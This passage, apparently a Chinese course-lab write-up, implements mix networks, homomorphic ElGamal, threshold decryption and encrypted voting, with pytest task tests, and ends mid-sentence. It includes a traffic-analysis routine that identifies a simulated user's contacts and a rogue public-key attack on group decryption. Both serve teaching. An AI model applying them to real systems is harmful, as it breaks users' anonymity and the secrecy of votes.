实现匿名通信有多种方法，其中最简单的莫过于所有发送的消息都通过广播的方式，如果接收到消息的人发现可以成功解密，说明消息是发送给自己的，否则丢弃。这当然不是好办法，但如果我们要自己设计匿名通信机制，需要注意不能比这一办法更差。\n高延迟匿名通信 # Mix 是一种高延迟匿名通信机制，实际上就是发送者将消息都发到一个叫做 Mix 的黑盒子里，随后消息从黑盒子里出来，再发送到接收者。如果 Mix 可以抵抗流量分析并提供比特级的不可关联性，那么就能保证匿名性了。\nAlice 用 Mix 公钥加密消息后发送给 Mix，随后 Mix 解密并发送给 Bob。由于任何人都可以给 Mix 发消息，而 Mix 的模式实际上为攻击者提供了一个解密 Oracle，因此攻击者可以通过修改输入来进行选择密文攻击，这就要求加密机制是 IND-CCA 的。否则，攻击者就可以关联输入和输出，破坏比特不可关联性。\n另一方面，如果 Mix 采用 FIFO 方式接收和发送消息，那么攻击者只需要进行流量分析就能简单地关联输入和输出了，此时 Mix 是不能抵抗流量分析的。可以看到，抗流量分析保护元数据，而比特不可关联性保护数据。\n因此，顾名思义，Mix 需要像洗牌一样打乱收到的消息并随机输出，在 Mix 内部也需要一个消息池来暂存还没有发出去的消息，通过延迟、故意插入无用包、故意丢包等手段抵抗流量分析，这就是高延迟的由来。\n单个 Mix # 接下来来构建这样的黑盒子，首先是 Mix Server 部分：\ndef aes_ctr_enc_dec(key, iv, message): \u0026#34;\u0026#34;\u0026#34; A helper function that implements AES Counter (CTR) Mode encryption and decryption. Expects a key (16 byte), and IV (16 bytes) and an input plaintext / ciphertext. If it is not obvious convince yourself that CTR encryption and decryption are in fact the same operations. \u0026#34;\u0026#34;\u0026#34; aes = Cipher(\u0026#34;AES-128-CTR\u0026#34;) enc = aes.enc(key, iv) output = enc.update(message) output += enc.finalize() return output # This is the type of messages destined for the one-hop mix OneHopMixMessage = namedtuple(\u0026#39;OneHopMixMessage\u0026#39;, [\u0026#39;ec_public_key\u0026#39;, \u0026#39;hmac\u0026#39;, \u0026#39;address\u0026#39;, \u0026#39;message\u0026#39;]) def mix_server_one_hop(private_key, message_list): \u0026#34;\u0026#34;\u0026#34; Implements the decoding for a simple one-hop mix. Each message is decoded in turn: - A shared key is derived from the message public key and the mix private_key. - the hmac is checked against all encrypted parts of the message - the address and message are decrypted, decoded and returned \u0026#34;\u0026#34;\u0026#34; G = EcGroup() out_queue = [] # Process all messages for msg in message_list: # Check elements and lengths if not G.check_point(msg.ec_public_key) or \\ not len(msg.hmac) == 20 or \\ not len(msg.address) == 258 or \\ not len(msg.message) == 1002: raise Exception(\u0026#34;Malformed input message\u0026#34;) # First get a shared key shared_element = private_key * msg.ec_public_key key_material = sha512(shared_element.export()).digest() # Use different parts of the shared key for different operations hmac_key = key_material[:16] address_key = key_material[16:32] message_key = key_material[32:48] # Check the HMAC h = Hmac(b\u0026#34;sha512\u0026#34;, hmac_key) h.update(msg.address) h.update(msg.message) expected_mac = h.digest() if not secure_compare(msg.hmac, expected_mac[:20]): raise Exception(\u0026#34;HMAC check failure\u0026#34;) # Decrypt the address and the message iv = b\u0026#34;\\x00\u0026#34; * 16 address_plaintext = aes_ctr_enc_dec(address_key, iv, msg.address) message_plaintext = aes_ctr_enc_dec(message_key, iv, msg.message) # Decode the address and message address_len, address_full = unpack(\u0026#34;!H256s\u0026#34;, address_plaintext) message_len, message_full = unpack(\u0026#34;!H1000s\u0026#34;, message_plaintext) output = (address_full[:address_len], message_full[:message_len]) out_queue += [output] return sorted(out_queue) 根据 Mix Server 逻辑编写 Mix Client 的逻辑：\ndef mix_client_one_hop(public_key, address, message): \u0026#34;\u0026#34;\u0026#34; Encode a message to travel through a single mix with a set public key. The maximum size of the final address and the message are 256 bytes and 1000 bytes respectively. Returns an \u0026#39;OneHopMixMessage\u0026#39; with four parts: a public key, an HMAC (20 bytes), an address ciphertext (256 + 2 bytes) and a message ciphertext (1002 bytes). \u0026#34;\u0026#34;\u0026#34; G = EcGroup() assert G.check_point(public_key) assert isinstance(address, bytes) and len(address) \u0026lt;= 256 assert isinstance(message, bytes) and len(message) \u0026lt;= 1000 # Encode the address and message # Use those as the payload for encryption address_plaintext = pack(\u0026#34;!H256s\u0026#34;, len(address), address) message_plaintext = pack(\u0026#34;!H1000s\u0026#34;, len(message), message) # Generate a fresh public key private_key = G.order().random() client_public_key = private_key * G.generator() # First get a shared key shared_element = private_key * public_key # client\u0026#39;s priv and mix\u0026#39;s pub key_material = sha512(shared_element.export()).digest() # Use different parts of the shared key for different operations hmac_key = key_material[:16] address_key = key_material[16:32] message_key = key_material[32:48] # Encrypt the address and the message iv = b\u0026#34;\\x00\u0026#34;*16 address_cipher = aes_ctr_enc_dec(address_key, iv, address_plaintext) message_cipher = aes_ctr_enc_dec(message_key, iv, message_plaintext) # Generate HMAC tag h = Hmac(b\u0026#34;sha512\u0026#34;, hmac_key) h.update(address_cipher) h.update(message_cipher) expected_mac = h.digest()[:20] return OneHopMixMessage(client_public_key, expected_mac, address_cipher, message_cipher) 测试消息能否正常发送和接收：\n@pytest.fixture def encode_Alice_message(): \u0026#34;\u0026#34;\u0026#34; Encode a single message \u0026#34;\u0026#34;\u0026#34; G = EcGroup() g = G.generator() o = G.order() private_key = o.random() public_key = private_key * g m1 = mix_client_one_hop(public_key, b\u0026#34;Alice\u0026#34;, b\u0026#34;Dear Alice,\\nHello!\\nBob\u0026#34;) return private_key, m1 @pytest.mark.task2 def test_Alice_message_overlong(): \u0026#34;\u0026#34;\u0026#34; Test overlong address or message \u0026#34;\u0026#34;\u0026#34; from os import urandom G = EcGroup() g = G.generator() o = G.order() private_key = o.random() public_key = private_key * g with raises(Exception) as excinfo: mix_client_one_hop(public_key, urandom(1000), b\u0026#34;Dear Alice,\\nHello!\\nBob\u0026#34;) with raises(Exception) as excinfo: mix_client_one_hop(public_key, b\u0026#34;Alice\u0026#34;, urandom(10000)) @pytest.mark.task2 def test_simple_client_part_type(encode_Alice_message): private_key, Alice_message = encode_Alice_message # Ensure the client encodes a NamedTuple of type \u0026#34;OneHopMixMessage\u0026#34; assert isinstance(Alice_message, tuple) assert len(Alice_message) == 4 assert Alice_message.ec_public_key assert Alice_message.hmac assert Alice_message.address assert Alice_message.message @pytest.mark.task2 def test_simple_client_decode(encode_Alice_message): private_key, Alice_message = encode_Alice_message # Ensure the mix can decode the message correctly res1 = mix_server_one_hop(private_key, [Alice_message]) assert len(res1) == 1 assert res1[0][0] == b\u0026#34;Alice\u0026#34; assert res1[0][1] == b\u0026#34;Dear Alice,\\nHello!\\nBob\u0026#34; @pytest.mark.task2 def test_simple_client_decode_many(): from os import urandom G = EcGroup() g = G.generator() o = G.order() private_key = o.random() public_key = private_key * g messages = [] for _ in range(100): m = mix_client_one_hop(public_key, urandom(256), urandom(1000)) messages += [m] # Ensure the mix can decode the message correctly res1 = mix_server_one_hop(private_key, messages) assert len(res1) == 100 多个 Mix # 为了分散负载和信任，我们可以使用多个 Mix。可以用级联方式增强匿名性（弱负载均衡），也可以用自由路由方式随机选一些 Mix 来传递消息，此时安全性取决于路径长度。\n既然目的之一是分散信任，就要考虑如果某个 Mix 被 corrupt 了怎么办。也就是说，我们要不仅要对监听者、还要对 Mix 本身隐藏路径长度以及当前步数。一个比较简单的方法就是嵌套加密，使得 Mix 使用自己的私钥解密时只能知道消息从哪来到哪去，无法了解全局的路径信息。\n在代码实现中，我们采用 blinding factor 隐藏公钥信息，并采用级联 HMAC 来检测消息篡改，尤其需要注意的是 blinding factor 和 HMAC 的处理顺序：\n# This is the type of messages destined for the n-hop mix NHopMixMessage = namedtuple(\u0026#39;NHopMixMessage\u0026#39;, [\u0026#39;ec_public_key\u0026#39;, \u0026#39;hmacs\u0026#39;, \u0026#39;address\u0026#39;, \u0026#39;message\u0026#39;]) def mix_server_n_hop(private_key, message_list, final=False): \u0026#34;\u0026#34;\u0026#34; Decodes a NHopMixMessage message and outputs either messages destined to the next mix or a list of tuples (address, message) (if final=True) to be sent to their final recipients. Broadly speaking the mix will process each message in turn: - it derives a shared key (using its private_key), - checks the first hmac, - decrypts all other parts, - either forwards or decodes the message. \u0026#34;\u0026#34;\u0026#34; G = EcGroup() out_queue = [] # Process all messages for msg in message_list: # Check elements and lengths if not G.check_point(msg.ec_public_key) or \\ not isinstance(msg.hmacs, list) or \\ not len(msg.hmacs[0]) == 20 or \\ not len(msg.address) == 258 or \\ not len(msg.message) == 1002: raise Exception(\u0026#34;Malformed input message\u0026#34;) # First get a shared key shared_element = private_key * msg.ec_public_key key_material = sha512(shared_element.export()).digest() # Use different parts of the shared key for different operations hmac_key = key_material[:16] address_key = key_material[16:32] message_key = key_material[32:48] # Extract a blinding factor for the public_key blinding_factor = Bn.from_binary(key_material[48:]) new_ec_public_key = blinding_factor * msg.ec_public_key # Check the HMAC h = Hmac(b\u0026#34;sha512\u0026#34;, hmac_key) for other_mac in msg.hmacs[1:]: h.update(other_mac) h.update(msg.address) h.update(msg.message) expected_mac = h.digest() if not secure_compare(msg.hmacs[0], expected_mac[:20]): raise Exception(\u0026#34;HMAC check failure\u0026#34;) # Decrypt the hmacs, address and the message aes = Cipher(\u0026#34;AES-128-CTR\u0026#34;) # Decrypt hmacs new_hmacs = [] for i, other_mac in enumerate(msg.hmacs[1:]): # Ensure the IV is different for each hmac iv = pack(\u0026#34;H14s\u0026#34;, i, b\u0026#34;\\x00\u0026#34; * 14) hmac_plaintext = aes_ctr_enc_dec(hmac_key, iv, other_mac) new_hmacs += [hmac_plaintext] # Decrypt address \u0026amp; message iv = b\u0026#34;\\x00\u0026#34; * 16 address_plaintext = aes_ctr_enc_dec(address_key, iv, msg.address) message_plaintext = aes_ctr_enc_dec(message_key, iv, msg.message) if final: # Decode the address and message address_len, address_full = unpack(\u0026#34;!H256s\u0026#34;, address_plaintext) message_len, message_full = unpack(\u0026#34;!H1000s\u0026#34;, message_plaintext) out_msg = (address_full[:address_len], message_full[:message_len]) out_queue += [out_msg] else: # Pass the new mix message to the next mix out_msg = NHopMixMessage( new_ec_public_key, new_hmacs, address_plaintext, message_plaintext) out_queue += [out_msg] return out_queue def mix_client_n_hop(public_keys, address, message): \u0026#34;\u0026#34;\u0026#34; Encode a message to travel through a sequence of mixes with a sequence public keys. The maximum size of the final address and the message are 256 bytes and 1000 bytes respectively. Returns an \u0026#39;NHopMixMessage\u0026#39; with four parts: a public key, a list of hmacs (20 bytes each), an address ciphertext (256 + 2 bytes) and a message ciphertext (1002 bytes). \u0026#34;\u0026#34;\u0026#34; G = EcGroup() # assert G.check_point(public_key) assert isinstance(address, bytes) and len(address) \u0026lt;= 256 assert isinstance(message, bytes) and len(message) \u0026lt;= 1000 # Encode the address and message # use those encoded values as the payload you encrypt! address_plaintext = pack(\u0026#34;!H256s\u0026#34;, len(address), address) message_plaintext = pack(\u0026#34;!H1000s\u0026#34;, len(message), message) # Generate a fresh public key private_key = G.order().random() client_public_key = private_key * G.generator() hmacs = [] hmac_keys, address_keys, message_keys = [], [], [] blinding_factor = 1 # Preprocess the keys for i, pubkey in enumerate(public_keys): # First get a shared key shared_element = private_key * blinding_factor * pubkey key_material = sha512(shared_element.export()).digest() # Use different parts of the shared key for different operations hmac_keys.append(key_material[:16]) address_keys.append(key_material[16:32]) message_keys.append(key_material[32:48]) # Update blinding factor for next round blinding_factor = blinding_factor * Bn.from_binary(key_material[48:]) n = len(hmac_keys) iv = b\u0026#34;\\x00\u0026#34;*16 # Traverse the mix server in reversed order for i in range(n-1, -1, -1): # Encrypt address \u0026amp; message address_cipher = aes_ctr_enc_dec( address_keys[i], iv, address_plaintext) message_cipher = aes_ctr_enc_dec( message_keys[i], iv, message_plaintext) # Encrypt other HMAC tags, each with a different IV for j, other_mac in enumerate(hmacs): iv = pack(\u0026#34;H14s\u0026#34;, j, b\u0026#34;\\x00\u0026#34;*14) hmacs[j] = aes_ctr_enc_dec(hmac_keys[i], iv, other_mac) # Generate HMAC tag and insert to the beginning of hmacs h = Hmac(b\u0026#34;sha512\u0026#34;, hmac_keys[i]) for other_mac in hmacs: h.update(other_mac) h.update(address_cipher) h.update(message_cipher) expected_mac = h.digest()[:20] hmacs.insert(0, expected_mac) # Update address \u0026amp; message for next round address_plaintext = address_cipher message_plaintext = message_cipher return NHopMixMessage(client_public_key, hmacs, address_cipher, message_cipher) 然后测试一下 1 跳和 3 跳两种情况下的正确性：\n@pytest.mark.task3 def test_Alice_encode_1_hop(): \u0026#34;\u0026#34;\u0026#34; Test sending a multi-hop message through 1-hop \u0026#34;\u0026#34;\u0026#34; from os import urandom G = EcGroup() g = G.generator() o = G.order() private_key = o.random() public_key = private_key * g address = b\u0026#34;Alice\u0026#34; message = b\u0026#34;Dear Alice,\\nHello!\\nBob\u0026#34; m1 = mix_client_n_hop([public_key], address, message) out = mix_server_n_hop(private_key, [m1], final=True) assert len(out) == 1 assert out[0][0] == address assert out[0][1] == message @pytest.mark.task3 def test_Alice_encode_3_hop(): \u0026#34;\u0026#34;\u0026#34; Test sending a multi-hop message through 1-hop \u0026#34;\u0026#34;\u0026#34; from os import urandom G = EcGroup() g = G.generator() o = G.order() private_keys = [o.random() for _ in range(3)] public_keys = [pk * g for pk in private_keys] address = b\u0026#34;Alice\u0026#34; message = b\u0026#34;Dear Alice,\\nHello!\\nBob\u0026#34; m1 = mix_client_n_hop(public_keys, address, message) out = mix_server_n_hop(private_keys[0], [m1]) out = mix_server_n_hop(private_keys[1], out) out = mix_server_n_hop(private_keys[2], out, final=True) assert len(out) == 1 assert out[0][0] == address assert out[0][1] == message 流量分析 # 我们通过例子来看如何通过简单的流量分析来推断一个发送者发送消息的目标。首先随机生成大量发送/接收消息的 trace：\ndef generate_trace(number_of_users, threshold_size, number_of_rounds, targets_friends): \u0026#34;\u0026#34;\u0026#34; Generate a simulated trace of traffic. \u0026#34;\u0026#34;\u0026#34; target = 0 others = range(1, number_of_users) all_users = range(number_of_users) trace = [] # Generate traces in which Alice (user 0) is not sending for _ in range(number_of_rounds // 2): senders = sorted(random.sample(others, threshold_size)) receivers = sorted(random.sample(all_users, threshold_size)) trace += [(senders, receivers)] # Generate traces in which Alice (user 0) is sending for _ in range(number_of_rounds // 2): senders = sorted([0] + random.sample(others, threshold_size - 1)) # Alice sends to a friend friend = random.choice(targets_friends) receivers = sorted( [friend] + random.sample(all_users, threshold_size - 1)) trace += [(senders, receivers)] random.shuffle(trace) return trace 这里 Alice 也就是 user0 会发送一些消息给她的好友，而其他用户之间的消息收发是完全随机的。我们不难发现，Alice 的好友应当比其他用户接收到了更多消息，这就是这次流量分析的关键：\ndef analyze_trace(trace, target_number_of_friends, target=0): \u0026#34;\u0026#34;\u0026#34; Given a trace of traffic, and a given number of friends, return the list of receiver identifiers that are the most likely friends of the target. \u0026#34;\u0026#34;\u0026#34; max_users = 100 rcv_cnt = dict.fromkeys(range(max_users), 0) for round in trace: senders, receivers = round for user in receivers: rcv_cnt[user] += 1 # sort in descending order according to occurence occur = sorted(rcv_cnt.items(), key=lambda d: (d[1], d[0]), reverse=True) # select the top [target_number_of_friends] users return list(map(lambda x: x[0], occur[:target_number_of_friends])) 这里我们根据接收消息次数对用户进行排序，并选择了前 target_number_of_friends 个用户，推断是 Alice 的好友。进行测试：\n@pytest.mark.task4 def test_trace_static(): # A fixed set and number of friends trace = generate_trace(100, 10, 1000, [1, 2, 3]) friends = analyze_trace(trace, 3) assert len(friends) == 3 assert sorted(friends) == [1, 2, 3] @pytest.mark.task4 def test_trace_variable(): # A random number of friends and random contacts friend_number = random.choice(range(1, 10)) friends = random.sample(range(100), friend_number) trace = generate_trace(100, 10, 1000, friends) TA_friends = analyze_trace(trace, len(friends)) assert len(TA_friends) == len(friends) assert sorted(TA_friends) == sorted(friends) 经多次实验，均可以通过这两个测试。\n低延迟匿名通信 # 也就是 Onion 路由，最著名的例子是 Tor 网络。如果 Alice 要发送消息给 Bob，那么 Alice 会选择 3 个 Tor 节点，将消息经由这 3 个节点发送到 Bob，这样任意节点都不知道消息是从 Alice 到 Bob 的。\n上述方法提供了发送者匿名性，但需要 Alice 知道 Bob 身份。如果要双向匿名，则需要 6 个 Tor 节点，两边对称。\nTor 节点将 IP、公钥等信息公开到 Directory Authorities 上，后者则生成一个 Consensus 供 Tor 客户端下载，从而获取 Tor 节点的信息。\n对于攻击者来说，依然可以用类似侧信道的方式攻击 Onion 路由。一种方法是将输入和输出放到桶中，计算两者关联，但桶的存在会降低精确度。更好的方法是根据输入和包延迟的概率分布构建模版，并用输出去匹配模版。因此，低延迟匿名通信更容易受到被动攻击。\n而如果攻击者能控制部分 Tor 节点，也不一定能控制某次通信的整条路径。如果攻击者控制了 Tor 网络中的 c 个节点，那么整条路径被控制的概率为 O(c^2)，因为攻击者必须控制第一个和最后一个节点才行。\n隐私友好型计算 Privacy-friendly Computation # 在前两部分，我们介绍了如何向第三方隐藏隐私信息，如通信内容、身份等，并且已经有类似 TLS 和 Tor 这类成熟的解决方案。但是，如果是要向通信的对方隐藏信息呢？\n例如，我们想计算 $y=f(x_1,\u0026hellip;,x_n)$，其中涉及的输入 $x_i$ 来自 n 个不同的主体，并且每个主体都不希望别人知道自己的 $x_i$。最简单的办法是引入可信第三方（TTP）来计算 y，然而且不论 TTP 未必存在，我们必须得考虑 4C 问题：\nCost：TTP 要花多少钱？ Corruption：TTP 真的可信吗？ Compulsion：TTP 有没有可能受到不可抗力影响（如法律）泄露隐私？ Compromise：TTP 有没有可能被入侵从而泄露隐私？ 可以看到，寄希望于 TTP 并不明智，不过这可以作为一个很好的比较标准，即我们设计的方案应尽可能接近引入 TTP 所能达到的效果。\n同态加密 # 一种方法是同态加密，即对密文的运算等同于对明文的运算，此时可以在不知道明文的情况下计算出经过运算的明文所对应的密文。以 ElGamal 为例，我们选择群 $G$ 中的两个元素 $g,h$，随机生成 $x\\in(0,ord(G))$ 作为私钥，那么公钥就是 $g^x$。随后再选择随机的 $k\\in(0,ord(G))$，计算密文 $E(m,k)=(g^k,g^{xk}h^m)$。\n解密时，对于密文 $(a,b)$，只需计算 $m=log_h(b(a^x)^{-1})$。然而离散对数问题是困难的，因此可以先离线计算一张 $log_h$ 表格（这就要求明文空间不能太大）。正确性易证，同态性则包含加法和常数乘法同态：\n$$ E(m_0,k_0)=(a_0,b_0)\\\\ E(m_1,k_1)=(a_1,b_1)\\\\ E(m_0+m_1,k_0+k_1)=(a_0a_1,b_0b_1)=(g^{k0+k1},g^{x(k0+k1)}h^{m0+m1})\\\\ E(cm_0, ck_0)=((a_0)^c,(b_0)^c) $$\n只满足常数乘法同态，不满足乘法同态。\n接下来，我们在椭圆曲线上实现 Elgamal。需要注意上文提到的运算降阶问题，公钥变成了 $xg$，密文为 $(kg,kxg+mh)$，解密时计算 $log_h(b-xa)$。\n@pytest.mark.task1 def test_encrypt(): params = setup() priv, pub = keyGen(params) assert encrypt(params, pub, 0) assert encrypt(params, pub, 10) assert encrypt(params, pub, -10) with raises(Exception) as excinfo: encrypt(params, pub, -1000) with raises(Exception) as excinfo: encrypt(params, pub, 1000) @pytest.mark.task1 def test_decrypt(): params = setup() priv, pub = keyGen(params) assert decrypt(params, priv, encrypt(params, pub, 0)) == 0 assert decrypt(params, priv, encrypt(params, pub, 2)) == 2 assert decrypt(params, priv, encrypt(params, pub, -2)) == -2 assert decrypt(params, priv, encrypt(params, pub, 99)) == 99 def setup(): \u0026#34;\u0026#34;\u0026#34;Generates the Cryptosystem Parameters.\u0026#34;\u0026#34;\u0026#34; G = EcGroup(nid=713) g = G.hash_to_point(b\u0026#34;g\u0026#34;) h = G.hash_to_point(b\u0026#34;h\u0026#34;) o = G.order() return G, g, h, o def keyGen(params): \u0026#34;\u0026#34;\u0026#34; Generate a private / public key pair \u0026#34;\u0026#34;\u0026#34; G, g, h, o = params priv = G.order().random() pub = priv * g return priv, pub def encrypt(params, pub, m): \u0026#34;\u0026#34;\u0026#34; Encrypt a message under the public key \u0026#34;\u0026#34;\u0026#34; if not -100 \u0026lt; m \u0026lt; 100: raise Exception(\u0026#34;Message value to low or high.\u0026#34;) G, g, h, o = params k = o.random() # (g^k, (pub^k)*(h^m)) c = (k*g, k*pub + m*h) return c def isCiphertext(params, ciphertext): \u0026#34;\u0026#34;\u0026#34; Check a ciphertext \u0026#34;\u0026#34;\u0026#34; (G, g, h, o) = params ret = len(ciphertext) == 2 a, b = ciphertext ret \u0026amp;= G.check_point(a) ret \u0026amp;= G.check_point(b) return ret _logh = None def logh(params, hm): \u0026#34;\u0026#34;\u0026#34; Compute a discrete log, for small number only \u0026#34;\u0026#34;\u0026#34; global _logh G, g, h, o = params # Initialize the map of logh if _logh is None: _logh = {} for m in range(-1000, 1000): _logh[(m * h)] = m if hm not in _logh: raise Exception(\u0026#34;No decryption found.\u0026#34;) return _logh[hm] def decrypt(params, priv, ciphertext): \u0026#34;\u0026#34;\u0026#34; Decrypt a message using the private key \u0026#34;\u0026#34;\u0026#34; assert isCiphertext(params, ciphertext) a, b = ciphertext # b * (a^priv)^(-1) hm = b - priv*a return logh(params, hm) 随后，编写同态加密函数：\n@pytest.mark.task2 def test_add(): params = setup() priv, pub = keyGen(params) one = encrypt(params, pub, 1) two = encrypt(params, pub, 2) three = add(params, pub, one, two) assert decrypt(params, priv, three) == 3 # Try it for a range of numbers for x in range(-10, 10): Ex = encrypt(params, pub, x) E2x = add(params, pub, Ex, Ex) assert decrypt(params, priv, E2x) == 2 * x @pytest.mark.task2 def test_mul(): params = setup() priv, pub = keyGen(params) two = encrypt(params, pub, 2) three = mul(params, pub, two, 2) assert decrypt(params, priv, three) == 4 # Try it for a range of numbers for x in range(-10, 10): Ex = encrypt(params, pub, x) E2x = mul(params, pub, Ex, 20) assert decrypt(params, priv, E2x) == 20 * x def add(params, pub, c1, c2): \u0026#34;\u0026#34;\u0026#34; Given two ciphertexts compute the ciphertext of the sum of their plaintexts. \u0026#34;\u0026#34;\u0026#34; assert isCiphertext(params, c1) assert isCiphertext(params, c2) a1, b1 = c1 a2, b2 = c2 c3 = (a1+a2, b1+b2) return c3 def mul(params, pub, c1, alpha): \u0026#34;\u0026#34;\u0026#34; Given a ciphertext compute the ciphertext of the product of the plaintext time alpha \u0026#34;\u0026#34;\u0026#34; assert isCiphertext(params, c1) a1, b1 = c1 c3 = (alpha * a1, alpha * b1) return c3 现在，我们来解决多方参与计算的问题。我们根据多方公钥，生成公共公钥。在整数域表示为 $g^{x_1+\u0026hellip;+x_n}$，在椭圆曲线上则是 $x_1g+\u0026hellip;+x_ng$。\n@pytest.mark.task3 def test_groupKey(): params = setup() (G, g, h, o) = params # Generate a group key priv1, pub1 = keyGen(params) priv2, pub2 = keyGen(params) pub = groupKey(params, [pub1, pub2]) # Check it is valid priv = (priv1 + priv2) % o assert decrypt(params, priv, encrypt(params, pub, 0)) == 0 def groupKey(params, pubKeys=None): \u0026#34;\u0026#34;\u0026#34; Generate a group public key from a list of public keys \u0026#34;\u0026#34;\u0026#34; if pubKeys is None: pubKeys = [] G, g, h, o = params pub = G.infinite() # 0 elem for pubKey in pubKeys: pub = pubKey + pub return pub 随后进行部分解密，最后一个解密的人输出明文。在整数域表示为 $b\\cdot a^{-x_1}\\cdot \u0026hellip;\\cdot a^{-x_n}$，在椭圆曲线上表示为 $b-x_1a-\u0026hellip;-x_na$。\n@pytest.mark.task3 def test_partial(): params = setup() (G, g, h, o) = params # Generate a group key priv1, pub1 = keyGen(params) priv2, pub2 = keyGen(params) pub = groupKey(params, [pub1, pub2]) # Each authority decrypts in turn c = encrypt(params, pub, 0) cprime = partialDecrypt(params, priv1, c) m = partialDecrypt(params, priv2, cprime, True) assert m == 0 def partialDecrypt(params, priv, ciphertext, final=False): \u0026#34;\u0026#34;\u0026#34; Given a ciphertext and a private key, perform partial decryption. If final is True, then return the plaintext. \u0026#34;\u0026#34;\u0026#34; assert isCiphertext(params, ciphertext) a1, b1 = ciphertext b1 = b1 - priv*a1 if final: return logh(params, b1) else: return a1, b1 现在假设某一方想要让生成的公共公钥等于自己的公钥，这样自己一个人就能解密密文了。那么他只需要提交一个自己构造的公钥即可，在整数域是 $\\frac{g^{x_j}}{\\Pi_{i\\neq j}\\ g^{x_i}}$，这样生成公共公钥 $\\Pi_{i\\neq j}\\ g^{x_i}\\cdot \\frac{g^{x_j}}{\\Pi_{i\\neq j}\\ g^{x_i}}=g^{x_j}$。在椭圆曲线上则是 $x_jg-\\Sigma_{i\\neq j}\\ x_ig$。\n@pytest.mark.task4 def test_badpub(): params = setup() (G, g, h, o) = params # Four authorities generate keys priv1, pub1 = keyGen(params) priv2, pub2 = keyGen(params) priv3, pub3 = keyGen(params) priv4, pub4 = keyGen(params) # Derive a bad key x = o.random() badpub = corruptPubKey(params, x, [pub1, pub2, pub3, pub4]) # Derive the group key including the bad public key pub = groupKey(params, [pub1, pub2, pub3, pub4, badpub]) # Check that the corrupt authority can decrypt a message # encrypted under the group key with its secret only. assert decrypt(params, x, encrypt(params, pub, 0)) == 0 def corruptPubKey(params, priv, OtherPubKeys=None): \u0026#34;\u0026#34;\u0026#34; Simulate the operation of a corrupt decryption authority. Given a set of public keys from other authorities return a public key for the corrupt authority that leads to a group public key corresponding to a private key known to the corrupt authority. \u0026#34;\u0026#34;\u0026#34; if OtherPubKeys is None: OtherPubKeys = [] G, g, h, o = params pub = priv*g for pubkey in OtherPubKeys: pub = pub - pubkey return pub 秘密分享 # 秘密分享采用了另一种思路，将秘密拆分成若干碎片提供给不同 authorities，从而在避免 authorities 得知秘密的同时，能够让 authorities 进行协同计算。这个“协同计算”部分实际上是依赖于加法同态加密的，例如我们用 \u0026lt;a\u0026gt; 表示 a 的碎片集合，那么 \u0026lt;a+b\u0026gt;=\u0026lt;a\u0026gt;+\u0026lt;b\u0026gt;，此时计算出的是一个新的秘密的一个碎片。加常数和乘常数也是类似的。\n不过，如果是秘密碎片之间的乘法就比较复杂了，这需要一些预计算的值以及 authorities 之间的交互。例如，要计算 \u0026lt;x\u0026gt; 和 \u0026lt;y\u0026gt; 的积，我们需要先预计算 \u0026lt;a\u0026gt;,\u0026lt;b\u0026gt;,\u0026lt;c\u0026gt; 使得 \u0026lt;c\u0026gt;=\u0026lt;ab\u0026gt;，其中 \u0026lt;a\u0026gt;,\u0026lt;b\u0026gt; 是随机的，这样才能隐藏 \u0026lt;x\u0026gt; 和 \u0026lt;y\u0026gt;。\n接下来，计算 \u0026lt;e\u0026gt;=\u0026lt;x\u0026gt;+\u0026lt;a\u0026gt;，\u0026lt;d\u0026gt;=\u0026lt;y\u0026gt;+\u0026lt;b\u0026gt;，公开 \u0026lt;e\u0026gt;,\u0026lt;d\u0026gt; 获得 e,d。此时方能计算 \u0026lt;z\u0026gt;=\u0026lt;xy\u0026gt;=\u0026lt;c\u0026gt;-e\u0026lt;b\u0026gt;-d\u0026lt;a\u0026gt;+ed。\n秘密分享相对于同态加密的优势在于可以加入机制确保完整性。传统方法是 authorities 进行零知识证明，表明其公开的值是合法的，但性能堪忧。SPDZ 则引入 MAC 并将 MAC 也拆成碎片，并通过并行验证提高性能，使得完整性检查较为廉价。\n综合来看，秘密分享额外增加了网络负担，而同态加密额外增加了计算负担，对于大规模计算而言总体性能较差。目前两者都依然处于研究阶段，尚不成熟。\n私密投票 # 最后我们实现一个私密投票的场景：\n@pytest.mark.task5 def test_poll(): votes = [1, 0, 1, 0, 1, 1, 0, 1, 1, 1] v0, v1 = simulate_poll(votes) assert v0 == 3 assert v1 == 7 我们需要在不知道明文的情况下，统计 0 和 1 的个数。首先为 authorities 生成密钥对并生成公共公钥，用 encode_vote() 来加密投票情况。随后调用 process_votes() 针对密文统计个数，最后 partialDecrypt() 解密个数信息并返回。\ndef encode_vote(params, pub, vote): \u0026#34;\u0026#34;\u0026#34; Given a vote 0 or 1 encode the vote as two ciphertexts representing the count of votes for zero and the votes for one.\u0026#34;\u0026#34;\u0026#34; assert vote in [0, 1] v0, v1 = encrypt(params, pub, vote) return v0, v1 def process_votes(params, pub, encrypted_votes): \u0026#34;\u0026#34;\u0026#34; Given a list of encrypted votes tally them to sum votes for zeros and votes for ones. \u0026#34;\u0026#34;\u0026#34; assert isinstance(encrypted_votes, list) tv1 = encrypt(params, pub, 0) # 0 elem for c in encrypted_votes: tv1 = add(params, pub, tv1, c) total = len(encrypted_votes) # total + (-1)*tv1 tv0 = encrypt(params, pub, total) tv0 = add(params, pub, tv0, mul(params, pub, tv1, -1)) return tv0, tv1 def simulate_poll(votes): \u0026#34;\u0026#34;\u0026#34; Simulates the full process of encrypting votes, tallying them, and then decrypting the total. \u0026#34;\u0026#34;\u0026#34; # Generate parameters for the crypto-system params = setup() # Make keys for 3 authorities priv1, pub1 = keyGen(params) priv2, pub2 = keyGen(params) priv3, pub3 = keyGen(params) pub = groupKey(params, [pub1, pub2, pub3]) # Simulate encrypting votes encrypted_votes = [] for v in votes: encrypted_votes.append(encode_vote(params, pub, v)) # Tally the votes total_v0, total_v1 = process_votes(params, pub, encrypted_votes) # Simulate threshold decryption privs = [priv1, priv2, priv3] for priv in privs[:-1]: total_v0 = partialDecrypt(params, priv, total_v0) total_v1 = partialDecrypt(params, priv, total_v1) total_v0 = partialDecrypt(params, privs[-1], total_v0, True) total_v1 = partialDecrypt(params, privs[-1], total_v1, True) # Return the plaintext values return total_v0, total_v1 零知识证明 ZKP # 零知识证明中，prover 向 verifier 证明关于 secret 的一个命题，并且不泄露任何 secret 的信息。一个典型的例子就是数字签名，prover 证明他拥有私钥而不泄露私钥信息。\nSchnorr Identification 协议 # 公共参数：群 $G$，$q=ord(G)$，生成元 $g$ Prover 拥有私钥 $x$，公钥 $pub=g^x$。选择随机的 $w$，计算 $W=g^w$ 发送给 Verifier Verifier 返回随机的挑战值 $c$ Prover 计算 $r=w-cx\\ (mod\\ q)$ 